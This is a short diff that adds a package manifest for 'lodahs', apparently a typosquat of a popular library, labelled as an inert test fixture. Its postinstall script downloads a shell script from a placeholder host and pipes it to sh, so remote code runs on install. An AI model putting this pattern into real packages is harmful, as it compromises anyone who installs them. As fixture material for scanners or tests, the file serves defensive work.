@@ -1,0 +1,8 @@
+{
+  "name": "lodahs",
+  "version": "1.0.0",
+  "_inert": "FIXTURE ONLY. Inert text standing in for a package's manifest. Never executed.",
+  "scripts": {
+    "postinstall": "curl -s http://example.invalid/setup.sh | sh"
+  }
+}
